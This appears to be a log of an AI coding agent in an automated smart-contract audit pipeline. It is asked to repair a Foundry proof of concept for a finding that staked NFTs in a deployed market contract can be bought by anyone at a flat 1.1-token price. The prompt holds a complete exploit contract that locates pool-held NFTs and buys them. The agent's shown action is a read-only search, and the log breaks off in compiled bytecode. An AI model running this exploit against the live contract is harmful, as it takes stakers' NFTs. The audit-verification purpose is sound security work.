@@ -1,0 +1,3234 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e36be-8f81-7f50-88bb-7fa03cf62e93
+--------
+user
+You are fixing a failing Foundry PoC for finding F-003.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Any user can buy staked NFTs out of the shared pool at a fixed 1.1-token price
+- claim: `stakeNFTs()` transfers token IDs into the market contract, but the contract never records who deposited which NFT or marks them as non-sale inventory. `targetedPurchase()` later lets any caller specify arbitrary token IDs and pulls those IDs out of the contract for a flat `1.1 ether` each via `_targetedPurchase()`. That means freshly staked NFTs become immediately purchasable by anyone, regardless of the original owner’s intent.
+- impact: A buyer can monitor for rare or valuable NFTs being staked and immediately extract them from the pool for the floor price, capturing the full rarity premium and leaving the original staker with only a fungible claim.
+- exploit_paths: ["Victim calls `stakeNFTs([rareTokenId])` and transfers the NFT into the market contract.", "Attacker calls `targetedPurchase([rareTokenId])` and acquires that specific NFT for `1.1 ether` worth of Rugged.", "Victim can no longer recover the original NFT and is left with only the protocol\u2019s fungible accounting claim."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IMarketLike {
+    function ruggedToken() external view returns (address);
+    function stakeNFTs(uint256[] calldata tokenIds) external;
+    function targetedPurchase(uint256[] calldata tokenIds) external;
+}
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC404Like {
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
+    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
+}
+
+interface IUniswapV2Router02Like {
+    function WETH() external pure returns (address);
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+}
+
+contract VictimStaker {
+    address public immutable market;
+    address public immutable rugged;
+    address public immutable controller;
+
+    constructor(address _market, address _rugged, address _controller) {
+        market = _market;
+        rugged = _rugged;
+        controller = _controller;
+    }
+
+    function stakeSingle(uint256 tokenId) external {
+        require(msg.sender == controller, "ONLY_CONTROLLER");
+
+        // This models the missing path stage directly: a victim-approved NFT is staked
+        // into the shared market pool through `stakeNFTs([tokenId])`.
+        IERC404Like(rugged).approve(market, tokenId);
+
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(market).stakeNFTs(tokenIds);
+    }
+}
+
+contract FlawVerifier {
+    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
+    address public constant UNISWAP_V2_ROUTER =
+        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    uint256 public constant PRICE_PER_NFT = 1.1 ether;
+    uint256 public constant MAX_TOKEN_ID = 10_000;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public hypothesisValidated;
+    bool public victimStakeObserved;
+    uint256 public acquiredTokenId;
+    uint256 public ruggedSpent;
+    uint256 public ruggedBalanceBefore;
+    uint256 public ruggedBalanceAfter;
+    bytes32 public lastStatus;
+
+    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated) {
+            return;
+        }
+
+        address rugged = IMarketLike(MARKET).ruggedToken();
+        _profitToken = rugged;
+
+        uint256 tokenId = _stageVictimStakeOrObserveExisting(rugged);
+        if (tokenId == 0) {
+            lastStatus = keccak256("NO_STAKED_NFT_PATH_AVAILABLE");
+            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
+            return;
+        }
+
+        victimStakeObserved = true;
+
+        // direct_or_existing_balance_first:
+        // spend verifier-held Rugged first. If the verifier only has ETH, source the minimum
+        // buy-side funds via a public Uniswap V2 swap instead of any privileged state mutation.
+        _maybeAcquireRuggedFromHeldETH(rugged);
+
+        ruggedBalanceBefore = _ruggedBalance(rugged);
+        if (ruggedBalanceBefore < PRICE_PER_NFT) {
+            lastStatus = keccak256("INSUFFICIENT_EXISTING_FUNDS_FOR_TARGETED_PURCHASE");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        if (!_approve(rugged, MARKET, type(uint256).max)) {
+            lastStatus = keccak256("APPROVE_FAILED");
+            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
+            return;
+        }
+
+        // Path stage 2: after the NFT is in the shared pool, the attacker can buy that exact
+        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
+        uint256[] memory tokenIds = new uint256[](1);
+        tokenIds[0] = tokenId;
+        IMarketLike(MARKET).targetedPurchase(tokenIds);
+
+        if (_ownerOf(rugged, tokenId) != address(this)) {
+            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_NFT");
+            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
+            return;
+        }
+
+        acquiredTokenId = tokenId;
+        ruggedBalanceAfter = _ruggedBalance(rugged);
+        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
+            ? ruggedBalanceBefore - ruggedBalanceAfter
+            : 0;
+        hypothesisValidated = true;
+
+        // The core exploit realizes value by extracting a specific victim-staked NFT for a
+        // fungible floor price. This verifier does not fabricate a secondary NFT exit, so the
+        // fungible realized profit remains zero unless a real on-chain sale route already exists.
+        _profitAmount = 0;
+        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
+        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
+    }
+
+    function profitToken() external view returns (address) {
+        if (_profitToken != address(0)) {
+            return _profitToken;
+        }
+        return IMarketLike(MARKET).ruggedToken();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _stageVictimStakeOrObserveExisting(address rugged) internal returns (uint256) {
+        uint256 verifierOwnedTokenId = _findOwnedToken(rugged, address(this));
+        if (verifierOwnedTokenId != 0) {
+            VictimStaker victim = new VictimStaker(MARKET, rugged, address(this));
+
+            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+            // preserves the finding's causality without any privileged impersonation.
+            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+            victim.stakeSingle(verifierOwnedTokenId);
+
+            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+                return verifierOwnedTokenId;
+            }
+        }
+
+        // On the common fork path the victim stake already happened before the PoC transaction.
+        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+        // some public user previously transferred that NFT into the shared pool via staking.
+        return _findOwnedToken(rugged, MARKET);
+    }
+
+    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+            if (_ownerOf(rugged, tokenId) == owner) {
+                return tokenId;
+            }
+        }
+        return 0;
+    }
+
+    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
+        (bool ok, bytes memory data) =
+            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
+        if (!ok || data.length < 32) {
+            return address(0);
+        }
+        owner = abi.decode(data, (address));
+    }
+
+    function _ruggedBalance(address rugged) internal view returns (uint256) {
+        return IERC20Like(rugged).balanceOf(address(this));
+    }
+
+    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
+        return ok && (data.length == 0 || abi.decode(data, (bool)));
+    }
+
+    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
+        path[1] = rugged;
+
+        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
+            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+            0, path, address(this), block.timestamp
+        ) {} catch {
+            // If no live V2 route exists at the fork, continue with the verifier's current
+            // balance and report insufficient funds rather than fabricating capital.
+        }
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m inspecting the verifier and surrounding repo to infer why the path-alignment check failed and whether there are any on-chain interface details I need to preserve before editing `src/FlawVerifier.sol`.
+exec
+/bin/bash -lc "rg -n \"PATH_ALIGNMENT_ERROR|executeOnOpportunity|profitToken\\(|profitAmount\\(|exploit_paths|stakeNFTs|targetedPurchase\" -S ." in /Users/zhanglongqin/AuditHoundV2/cases/ruggedart/src/onchain_auto
+ succeeded in 0ms:
+./src/FlawVerifier.sol:6:    function stakeNFTs(uint256[] calldata tokenIds) external;
+./src/FlawVerifier.sol:7:    function targetedPurchase(uint256[] calldata tokenIds) external;
+./src/FlawVerifier.sol:46:        // into the shared market pool through `stakeNFTs([tokenId])`.
+./src/FlawVerifier.sol:51:        IMarketLike(market).stakeNFTs(tokenIds);
+./src/FlawVerifier.sol:79:    function executeOnOpportunity() public {
+./src/FlawVerifier.sol:115:        // token ID for the flat `1.1 ether` Rugged price via `targetedPurchase([tokenId])`.
+./src/FlawVerifier.sol:118:        IMarketLike(MARKET).targetedPurchase(tokenIds);
+./src/FlawVerifier.sol:141:    function profitToken() external view returns (address) {
+./src/FlawVerifier.sol:148:    function profitAmount() external view returns (uint256) {
+./src/FlawVerifier.sol:158:            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:177:    function stakeNFTs(uint256[] memory _tokenIds) external nonReentrant {
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:244:    function targetedPurchase(uint256[] memory _tokenIds) public {
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:250:        _targetedPurchase(_tokenIds);
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:253:    function _targetedPurchase(uint256[] memory _tokenIds) private {
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:277:    function targetedPurchase(
+./0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6/src/Market.sol:288:        _targetedPurchase(_tokenIds);
+./out/FlawVerifier.sol/IMarketLike.json:1:{"abi":[{"type":"function","name":"ruggedToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"stakeNFTs","inputs":[{"name":"tokenIds","type":"uint256[]","internalType":"uint256[]"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"targetedPurchase","inputs":[{"name":"tokenIds","type":"uint256[]","internalType":"uint256[]"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"ruggedToken()":"1f80f504","stakeNFTs(uint256[])":"0f48a482","targetedPurchase(uint256[])":"cc7280d6"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"ruggedToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"tokenIds\",\"type\":\"uint256[]\"}],\"name\":\"stakeNFTs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"tokenIds\",\"type\":\"uint256[]\"}],\"name\":\"targetedPurchase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/FlawVerifier.sol\":\"IMarketLike\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/FlawVerifier.sol\":{\"keccak256\":\"0x6d4a6da93454bdb57263cf3f294fd458e7889a7a4907594818d49a24db12518f\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1b46e6e3bfd99a3b4a9a2ee27205facd75887436f95fccabd3355d276cfa2f00\",\"dweb:/ipfs/Qmchuyn62HEZuhG9szK1V4ranczFagsprgYeR92gjbz8yv\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"view","type":"function","name":"ruggedToken","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function","name":"stakeNFTs"},{"inputs":[{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function","name":"targetedPurchase"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/FlawVerifier.sol":"IMarketLike"},"evmVersion":"prague","libraries":{}},"sources":{"src/FlawVerifier.sol":{"keccak256":"0x6d4a6da93454bdb57263cf3f294fd458e7889a7a4907594818d49a24db12518f","urls":["bzz-raw://1b46e6e3bfd99a3b4a9a2ee27205facd75887436f95fccabd3355d276cfa2f00","dweb:/ipfs/Qmchuyn62HEZuhG9szK1V4ranczFagsprgYeR92gjbz8yv"],"license":"MIT"}},"version":1},"id":0}
+./out/FlawVerifier.sol/FlawVerifier.json:1:{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"MARKET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"MAX_TOKEN_ID","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"PRICE_PER_NFT","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_ROUTER","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"acquiredTokenId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"lastStatus","inputs":[],"outputs":[{"name":"","type":"bytes32","internalType":"bytes32"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"ruggedBalanceAfter","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"ruggedBalanceBefore","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"ruggedSpent","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"victimStakeObserved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"event","name":"AttemptStatus","inputs":[{"name":"status","type":"bytes32","indexed":false,"internalType":"bytes32"},{"name":"tokenId","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"ruggedBalance","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506120388061001c5f395ff3fe6080604052600436106100e0575f3560e01c80636da612d81161007e578063cd40c0a711610058578063cd40c0a71461027b578063d6d86712146102a5578063e0024838146102cf578063f46f16c2146102f9576100e7565b80636da612d8146101fd578063a4de304f14610227578063a82ed9ec14610251576100e7565b8063463defd1116100ba578063463defd11461015557806347d92d181461017f57806349343624146101a95780635ff972cc146101d3576100e7565b80631cf986b5146100eb5780632c0be2ff146101155780633c2448ed1461013f576100e7565b366100e757005b5f5ffd5b3480156100f6575f5ffd5b506100ff610323565b60405161010c91906110df565b60405180910390f35b348015610120575f5ffd5b50610129610329565b60405161013691906110df565b60405180910390f35b34801561014a575f5ffd5b5061015361032f565b005b348015610160575f5ffd5b5061016961084f565b6040516101769190611112565b60405180910390f35b34801561018a575f5ffd5b50610193610861565b6040516101a09190611112565b60405180910390f35b3480156101b4575f5ffd5b506101bd610874565b6040516101ca919061116a565b60405180910390f35b3480156101de575f5ffd5b506101e7610977565b6040516101f491906110df565b60405180910390f35b348015610208575f5ffd5b50610211610980565b60405161021e91906110df565b60405180910390f35b348015610232575f5ffd5b5061023b610986565b60405161024891906110df565b60405180910390f35b34801561025c575f5ffd5b50610265610992565b604051610272919061116a565b60405180910390f35b348015610286575f5ffd5b5061028f6109aa565b60405161029c91906110df565b60405180910390f35b3480156102b0575f5ffd5b506102b96109b0565b6040516102c6919061119b565b60405180910390f35b3480156102da575f5ffd5b506102e36109b6565b6040516102f091906110df565b60405180910390f35b348015610304575f5ffd5b5061030d6109bc565b60405161031a919061116a565b60405180910390f35b60045481565b60065481565b60025f9054906101000a900460ff1661084d575f73fe380fe1db07e531e3519b9ae3ea9f7888ce20c673ffffffffffffffffffffffffffffffffffffffff16631f80f5046040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103a0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103c491906111e2565b9050805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f61040f826109d4565b90505f810361048b577feaa14d81f9b8227ba880fe1bc2427d88d4147886ff82574d568fc0a1411f6fb86007819055507fa66770e5c628a7546f0c6d5076f20b4e1ef5a04b9dabb34a78bf70d249b9b60b6007545f61046d85610b88565b60405161047c9392919061124f565b60405180910390a1505061084d565b6001600260016101000a81548160ff0219169083151502179055506104af82610c08565b6104b882610b88565b600581905550670f43fc2c04ee0000600554101561053d577f2864808a0f712723eb9c3769b8428d4213cfcaaa52b4f3ee83acecf61650679d6007819055507fa66770e5c628a7546f0c6d5076f20b4e1ef5a04b9dabb34a78bf70d249b9b60b6007548260055460405161052e93929190611284565b60405180910390a1505061084d565b61057c8273fe380fe1db07e531e3519b9ae3ea9f7888ce20c67fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff610e17565b6105ed577fcd400c5237ae346977ee020ef8d0d26a880c07edf7eba69a8848f0d31e9a88f26007819055507fa66770e5c628a7546f0c6d5076f20b4e1ef5a04b9dabb34a78bf70d249b9b60b600754826005546040516105de93929190611284565b60405180910390a1505061084d565b5f600167ffffffffffffffff811115610609576106086112b9565b5b6040519080825280602002602001820160405280156106375781602001602082028036833780820191505090505b50905081815f8151811061064e5761064d6112e6565b5b60200260200101818152505073fe380fe1db07e531e3519b9ae3ea9f7888ce20c673ffffffffffffffffffffffffffffffffffffffff1663cc7280d6826040518263ffffffff1660e01b81526004016106a791906113ca565b5f604051808303815f87803b1580156106be575f5ffd5b505af11580156106d0573d5f5f3e3d5ffd5b505050503073ffffffffffffffffffffffffffffffffffffffff166106f58484610f2c565b73ffffffffffffffffffffffffffffffffffffffff1614610784577f102b03580f00a565a0922443c50eca8d66058f659a1d307cf1d2dcbc3785b46f6007819055507fa66770e5c628a7546f0c6d5076f20b4e1ef5a04b9dabb34a78bf70d249b9b60b6007548361076586610b88565b60405161077493929190611284565b60405180910390a150505061084d565b8160038190555061079483610b88565b600681905550600654600554116107ab575f6107bc565b6006546005546107bb9190611417565b5b600481905550600160025f6101000a81548160ff0219169083151502179055505f6001819055507fadfc9196d06e46dedc15c945b3d7c563dda663957033829ebcc976f8a107f9566007819055507fa66770e5c628a7546f0c6d5076f20b4e1ef5a04b9dabb34a78bf70d249b9b60b6007548360065460405161084193929190611284565b60405180910390a15050505b565b60025f9054906101000a900460ff1681565b600260019054906101000a900460ff1681565b5f5f73ffffffffffffffffffffffffffffffffffffffff165f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146108f0575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050610974565b73fe380fe1db07e531e3519b9ae3ea9f7888ce20c673ffffffffffffffffffffffffffffffffffffffff16631f80f5046040518163ffffffff1660e01b8152600401602060405180830381865afa15801561094d573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061097191906111e2565b90505b90565b5f600154905090565b61271081565b670f43fc2c04ee000081565b737a250d5630b4cf539739df2c5dacb4c659f2488d81565b60055481565b60075481565b60035481565b73fe380fe1db07e531e3519b9ae3ea9f7888ce20c681565b5f5f6109e08330611047565b90505f8114610b61575f73fe380fe1db07e531e3519b9ae3ea9f7888ce20c68430604051610a0d906110ba565b610a199392919061144a565b604051809103905ff080158015610a32573d5f5f3e3d5ffd5b5090508373ffffffffffffffffffffffffffffffffffffffff166323b872dd3083856040518463ffffffff1660e01b8152600401610a729392919061147f565b5f604051808303815f87803b158015610a89575f5ffd5b505af1158015610a9b573d5f5f3e3d5ffd5b505050508073ffffffffffffffffffffffffffffffffffffffff16637b86a66e836040518263ffffffff1660e01b8152600401610ad891906110df565b5f604051808303815f87803b158015610aef575f5ffd5b505af1158015610b01573d5f5f3e3d5ffd5b5050505073fe380fe1db07e531e3519b9ae3ea9f7888ce20c673ffffffffffffffffffffffffffffffffffffffff16610b3a8584610f2c565b73ffffffffffffffffffffffffffffffffffffffff1603610b5f578192505050610b83565b505b610b7f8373fe380fe1db07e531e3519b9ae3ea9f7888ce20c6611047565b9150505b919050565b5f8173ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610bc2919061116a565b602060405180830381865afa158015610bdd573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c0191906114de565b9050919050565b670f43fc2c04ee0000610c1a82610b88565b101580610c2657505f47145b610e14575f600267ffffffffffffffff811115610c4657610c456112b9565b5b604051908082528060200260200182016040528015610c745781602001602082028036833780820191505090505b509050737a250d5630b4cf539739df2c5dacb4c659f2488d73ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610cd4573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610cf891906111e2565b815f81518110610d0b57610d0a6112e6565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250508181600181518110610d5a57610d596112e6565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050737a250d5630b4cf539739df2c5dacb4c659f2488d73ffffffffffffffffffffffffffffffffffffffff1663b6f9de95475f8430426040518663ffffffff1660e01b8152600401610de894939291906115c0565b5f604051808303818588803b158015610dff575f5ffd5b505af193505050508015610e11575060015b50505b50565b5f5f5f8573ffffffffffffffffffffffffffffffffffffffff1663095ea7b360e01b8686604051602401610e4c92919061160a565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610eb69190611683565b5f604051808303815f865af19150503d805f8114610eef576040519150601f19603f3d011682016040523d82523d5f602084013e610ef4565b606091505b5091509150818015610f2157505f81511480610f20575080806020019051810190610f1f91906116c3565b5b5b925050509392505050565b5f5f5f8473ffffffffffffffffffffffffffffffffffffffff16636352211e60e01b85604051602401610f5f91906110df565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610fc99190611683565b5f60405180830381855afa9150503d805f8114611001576040519150601f19603f3d011682016040523d82523d5f602084013e611006565b606091505b5091509150811580611019575060208151105b15611028575f92505050611041565b8080602001905181019061103c9190611729565b925050505b92915050565b5f5f600190505b61271081116110af578273ffffffffffffffffffffffffffffffffffffffff166110788583610f2c565b73ffffffffffffffffffffffffffffffffffffffff160361109c57809150506110b4565b80806110a790611754565b91505061104e565b505f90505b92915050565b6108678061179c83390190565b5f819050919050565b6110d9816110c7565b82525050565b5f6020820190506110f25f8301846110d0565b92915050565b5f8115159050919050565b61110c816110f8565b82525050565b5f6020820190506111255f830184611103565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6111548261112b565b9050919050565b6111648161114a565b82525050565b5f60208201905061117d5f83018461115b565b92915050565b5f819050919050565b61119581611183565b82525050565b5f6020820190506111ae5f83018461118c565b92915050565b5f5ffd5b6111c18161114a565b81146111cb575f5ffd5b50565b5f815190506111dc816111b8565b92915050565b5f602082840312156111f7576111f66111b4565b5b5f611204848285016111ce565b91505092915050565b5f819050919050565b5f819050919050565b5f61123961123461122f8461120d565b611216565b6110c7565b9050919050565b6112498161121f565b82525050565b5f6060820190506112625f83018661118c565b61126f6020830185611240565b61127c60408301846110d0565b949350505050565b5f6060820190506112975f83018661118c565b6112a460208301856110d0565b6112b160408301846110d0565b949350505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b611345816110c7565b82525050565b5f611356838361133c565b60208301905092915050565b5f602082019050919050565b5f61137882611313565b611382818561131d565b935061138d8361132d565b805f5b838110156113bd5781516113a4888261134b565b97506113af83611362565b925050600181019050611390565b5085935050505092915050565b5f6020820190508181035f8301526113e2818461136e565b905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f611421826110c7565b915061142c836110c7565b9250828203905081811115611444576114436113ea565b5b92915050565b5f60608201905061145d5f83018661115b565b61146a602083018561115b565b611477604083018461115b565b949350505050565b5f6060820190506114925f83018661115b565b61149f602083018561115b565b6114ac60408301846110d0565b949350505050565b6114bd816110c7565b81146114c7575f5ffd5b50565b5f815190506114d8816114b4565b92915050565b5f602082840312156114f3576114f26111b4565b5b5f611500848285016114ca565b91505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b61153b8161114a565b82525050565b5f61154c8383611532565b60208301905092915050565b5f602082019050919050565b5f61156e82611509565b6115788185611513565b935061158383611523565b805f5b838110156115b357815161159a8882611541565b97506115a583611558565b925050600181019050611586565b5085935050505092915050565b5f6080820190506115d35f830187611240565b81810360208301526115e58186611564565b90506115f4604083018561115b565b61160160608301846110d0565b95945050505050565b5f60408201905061161d5f83018561115b565b61162a60208301846110d0565b9392505050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f61165d82611631565b611667818561163b565b9350611677818560208601611645565b80840191505092915050565b5f61168e8284611653565b915081905092915050565b6116a2816110f8565b81146116ac575f5ffd5b50565b5f815190506116bd81611699565b92915050565b5f602082840312156116d8576116d76111b4565b5b5f6116e5848285016116af565b91505092915050565b5f6116f88261112b565b9050919050565b611708816116ee565b8114611712575f5ffd5b50565b5f81519050611723816116ff565b92915050565b5f6020828403121561173e5761173d6111b4565b5b5f61174b84828501611715565b91505092915050565b5f61175e826110c